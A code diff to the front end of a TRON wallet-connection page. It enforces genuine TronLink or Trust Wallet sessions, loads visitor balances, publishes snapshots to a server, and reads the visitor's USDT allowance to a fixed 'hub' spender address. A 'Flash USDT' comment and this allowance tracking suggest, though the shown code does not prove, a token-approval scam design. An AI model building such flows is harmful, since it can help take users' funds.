@@ -1,7 +1,9 @@
 import {
+  TRON_IN_APP_BROWSER_HINT,
   evaluateSessionRestore,
   firstEvmAddress,
   identifyEvmProvider,
+  requireGenuineTronSessionAddress,
   resolveSignInNetwork,
   sameWalletAddress,
   selectWalletProvider,
@@ -293,8 +295,11 @@ function renderProviderOptions() {
  * @param {"metamask" | "trust" | "tronlink" | "injected"} id
  */
 function selectProvider(id) {
-  const trustInApp = id === "trust" && /Trust/i.test(navigator.userAgent);
-  return selectWalletProvider(providers, id, trustInApp ? "tron" : null);
+  // Flash USDT assets require a genuine TRON provider for Trust and TronLink.
+  if (id === "trust" || id === "tronlink") {
+    return selectWalletProvider(providers, id, "tron");
+  }
+  return selectWalletProvider(providers, id, null);
 }
 
 async function initializeSessions() {
@@ -351,7 +356,7 @@ async function connectWalletConnect() {
   setControlsDisabled(true);
   configurePairingPanel(
     "Connect visitor wallet",
-    "Scan the QR code with your TRON wallet. After pairing, balances load from your wallet provider.",
+    `Scan with a TRON wallet, or ${TRON_IN_APP_BROWSER_HINT} EVM-only WalletConnect sessions are rejected.`,
   );
   ui.ownerHubTarget.textContent = CONNECTION_TARGET;
   ui.linkTargetAddress.textContent = CONNECTION_TARGET;
@@ -626,6 +631,17 @@ async function connectSelected(walletId) {
         : "The wallet network could not be read.");
     }
 
+    if (walletId === "trust" || walletId === "tronlink" || wallet.network === "tron") {
+      const tronSession = requireGenuineTronSessionAddress(address, network);
+      if (!tronSession.ok) throw new Error(tronSession.error);
+      const tronWeb = await waitForTronWeb(wallet.provider, { requiredAddress: tronSession.address, maxAttempts: 20 });
+      const tronReady = tronWeb && typeof tronWeb === "object"
+        && typeof /** @type {{ trx?: { getBalance?: unknown } }} */ (tronWeb).trx?.getBalance === "function";
+      if (!tronReady) {
+        throw new Error(`A genuine TRON provider session is required before assets can load. ${TRON_IN_APP_BROWSER_HINT}`);
+      }
+    }
+
     const existing = await fetchJson("/api/auth/session");
     if (existing.ok && existing.body?.session
       && sameWalletAddress(existing.body.session.address, address)
@@ -643,7 +659,9 @@ async function connectSelected(walletId) {
     showState({
       kind: "success",
       title: "Wallet connected",
-      message: "Your verified address is shown below. Balances and recent activity load from your wallet provider.",
+      message: authenticated.network === "tron"
+        ? "TRON session verified. Loading TRX, known TRC-20 balances, and remaining USDT allowance…"
+        : "Your verified address is shown below. Balances and recent activity load from your wallet provider.",
       address,
     });
     showConnected(authenticated);
@@ -655,6 +673,7 @@ async function connectSelected(walletId) {
       message: rejected
         ? "You declined the wallet request. Nothing was signed or submitted."
         : publicError(error),
+      help: walletId === "trust" || walletId === "tronlink" ? mobileHelp(walletId) : null,
     });
   } finally {
     busy = false;
@@ -828,6 +847,9 @@ function showConnected(authenticated, options = {}) {
     ui.linkedWalletView.hidden = false;
     ui.linkedWalletView.removeAttribute("hidden");
     ui.dialogWalletAssets.scrollIntoView({ behavior: "smooth", block: "start" });
+    if (authenticated.network === "tron" && looksLikeTronAddress(authenticated.address)) {
+      void refreshManagerAllowance({ quietWithoutProvider: true });
+    }
   });
   showWalletManager(authenticated);
 }
@@ -942,21 +964,43 @@ async function presentConnectedWallet(address, options = {}) {
   if (options.scrollIntoView !== false) {
     ui.linkedWalletView.scrollIntoView({ behavior: "smooth", block: "start" });
   }
+  const genuine = requireGenuineTronSessionAddress(
+    session && sameWalletAddress(session.address, trimmed) ? session.address : "",
+    session?.network || "evm",
+  );
+  if (!genuine.ok) {
+    showWalletAssetError(`${genuine.error} Public address lookup alone is not treated as a wallet connection.`);
+    showSnapshotSync("Snapshot not published. Connect a genuine TRON provider session first.", true);
+    return;
+  }
+
   const tronWeb = await resolveConnectedTronWeb(trimmed);
   if (generation !== assetFetchGeneration) return;
   let assets;
   /** @type {Array<{ txid: string, when: string, direction: string, summary: string }>} */
   let transactions = [];
-  let source = "connected wallet provider";
-  if (tronWeb) {
+  let source = "connected TRON wallet provider";
+  const tronProviderReady = tronWeb && typeof tronWeb === "object"
+    && typeof /** @type {{ trx?: { getBalance?: unknown } }} */ (tronWeb).trx?.getBalance === "function";
+  if (tronProviderReady) {
     assets = await fetchTronWalletAssetsFromTronWeb(tronWeb, trimmed);
-  } else if (session && sameWalletAddress(session.address, trimmed)) {
-    source = "read-only TRON mainnet fallback";
+  } else if (session?.walletId === "walletconnect" && session.network === "tron") {
+    // Verified WalletConnect TRON session (T…) without injected TronWeb: chain read only after genuine pairing.
+    source = "verified WalletConnect TRON session · TRON mainnet read";
     const fallback = await fetchJson(`/api/public/wallet-assets?address=${encodeURIComponent(trimmed)}`);
     assets = publicTronSnapshotAssets(fallback);
+    if (!assets.ok) {
+      showWalletAssetError(
+        `${assets.error || "Balances could not be read."} ${TRON_IN_APP_BROWSER_HINT}`,
+      );
+      showSnapshotSync("Snapshot not published. Open the TRON in-app browser for provider reads, then retry.", true);
+      return;
+    }
   } else {
-    showWalletAssetError("No verified wallet session or injected TRON provider is available. Open this page inside TronLink and connect, or use WalletConnect and finish the login signature.");
-    showSnapshotSync("Snapshot not published. Complete wallet connection, then retry balance sync.", true);
+    showWalletAssetError(
+      `No injected TRON provider session is available. ${TRON_IN_APP_BROWSER_HINT} Public address lookup alone is not enough.`,
+    );
+    showSnapshotSync("Snapshot not published. Complete a genuine TRON provider connection, then retry.", true);
     return;
   }
   if (generation !== assetFetchGeneration) return;
@@ -965,14 +1009,17 @@ async function presentConnectedWallet(address, options = {}) {
     showSnapshotSync("Snapshot not published because balances could not be verified. Unlock or reconnect the wallet, then retry.", true);
     return;
   }
-  applyWalletAssetSuccess(trimmed, { address: trimmed, assets });
-  if (tronWeb) {
+  applyWalletAssetSuccess(trimmed, { address: trimmed, assets, source });
+  if (tronProviderReady) {
     const txResult = await fetchTronRecentTransactionsFromTronWeb(tronWeb, trimmed);
     if (generation !== assetFetchGeneration) return;
     transactions = txResult.ok ? txResult.transactions : [];
     applyWalletTransactionSuccess(transactions, txResult.ok ? "" : txResult.error);
   } else {
-    applyWalletTransactionSuccess([], "Recent activity requires an injected wallet provider; balances still synced from read-only TRON mainnet data.");
+    applyWalletTransactionSuccess(
+      [],
+      "Recent activity needs an injected TRON provider (TronLink / Trust TRON). Balances above came from the verified TRON session’s mainnet read.",
+    );
   }
   if (session) {
     const published = await publishProviderSnapshot(session, assets, transactions);
@@ -1042,7 +1089,7 @@ async function presentConnectedEvmWallet(address, chainId, options = {}) {
 
 /**
  * @param {string} requestedAddress
- * @param {{ address?: string, assets: unknown }} payload
+ * @param {{ address?: string, assets: unknown, source?: string }} payload
  */
 function applyWalletAssetSuccess(requestedAddress, payload) {
   const resolvedAddress = payload.address || requestedAddress;
@@ -1051,9 +1098,10 @@ function applyWalletAssetSuccess(requestedAddress, payload) {
   const tokens = normalizeWalletAssetTokens(payload.assets);
   renderWalletAssetLists(tokens);
   clearWalletAssetError();
+  const source = payload.source || "connected TRON wallet provider";
   const note = tokens.length === 1 && tokens[0].display === "0 TRX"
-    ? `Loaded from your wallet provider for ${shortenWalletAddress(resolvedAddress)}. This wallet currently shows 0 TRX.`
-    : `Balances for ${shortenWalletAddress(resolvedAddress)} were read through your connected TRON wallet (TronWeb). Hub link ${shortenWalletAddress(CONNECTION_TARGET)} is recorded separately.`;
+    ? `Loaded via ${source} for ${shortenWalletAddress(resolvedAddress)}. This wallet currently shows 0 TRX.`
+    : `Balances for ${shortenWalletAddress(resolvedAddress)} were read via ${source} (TRX + known TRC-20 starting with official USDT). Hub link ${shortenWalletAddress(CONNECTION_TARGET)} is recorded separately. Remaining capped USDT allowance refreshes below.`;
   ui.linkedAssetNote.textContent = note;
   ui.dialogAssetNote.textContent = note;
 }
@@ -1237,21 +1285,34 @@ async function onManagerSignTransfer() {
   }
 }
 
-async function refreshManagerAllowance() {
+/**
+ * @param {{ quietWithoutProvider?: boolean }} [options]
+ */
+async function refreshManagerAllowance(options = {}) {
   if (managerTransferBusy || !session || !activeWallet || session.network !== "tron") return;
   managerTransferBusy = true;
   clearManagerTransferError();
-  ui.managerTransferStatus.textContent = "Reading official USDT balance and spender allowance from TRON…";
+  ui.managerTransferStatus.textContent = "Reading official USDT balance and remaining capped spender allowance from TRON…";
   try {
     const tronWeb = await waitForTronWeb(activeWallet.provider, { requiredAddress: session.address, maxAttempts: 20 });
-    if (!tronWeb) throw new Error("The TRON wallet did not expose a provider session.");
+    if (!tronWeb) {
+      if (options.quietWithoutProvider) {
+        ui.managerUsdtBalance.textContent = "Provider required";
+        ui.managerUsdtAllowance.textContent = "Provider required";
+        ui.managerTransferStatus.textContent =
+          `Remaining allowance needs an injected TRON provider after connect. ${TRON_IN_APP_BROWSER_HINT}`;
+        return;
+      }
+      throw new Error("The TRON wallet did not expose a provider session.");
+    }
     const network = await readTronGenesisForTransfer(tronWeb);
     if (!network.ok) throw new Error(network.message);
     const state = await readUsdtAllowanceState(tronWeb, session.address, CONNECTION_TARGET);
     if (!state.ok) throw new Error(state.error);
     ui.managerUsdtBalance.textContent = state.balanceDisplay;
     ui.managerUsdtAllowance.textContent = state.allowanceDisplay;
-    ui.managerTransferStatus.textContent = "Balance and remaining allowance refreshed. Connection itself did not request approval.";
+    ui.managerTransferStatus.textContent =
+      `Official USDT balance and remaining allowance (max ${MAX_ALLOWANCE_USDT.toLocaleString()} USDT cap) refreshed. Connection itself did not request approval.`;
   } catch (error) {
     showManagerTransferError(publicError(error));
     ui.managerTransferStatus.textContent = "Could not refresh allowance.";
@@ -1512,8 +1573,12 @@ function collectStrings(value, depth = 0) {
  */
 function missingWalletMessage(walletId) {
   if (walletId === "metamask") return "Install or unlock MetaMask, or open this page in its mobile browser.";
-  if (walletId === "trust") return "Open this page in Trust Wallet’s browser and choose an EVM or TRON account.";
-  if (walletId === "tronlink") return "Install or unlock TronLink, or open this page in the TronLink mobile browser.";
+  if (walletId === "trust") {
+    return `Trust Wallet’s TRON provider was not detected. ${TRON_IN_APP_BROWSER_HINT}`;
+  }
+  if (walletId === "tronlink") {
+    return `TronLink was not detected. ${TRON_IN_APP_BROWSER_HINT}`;
+  }
   return "No additional injected wallet provider was found.";
 }
 
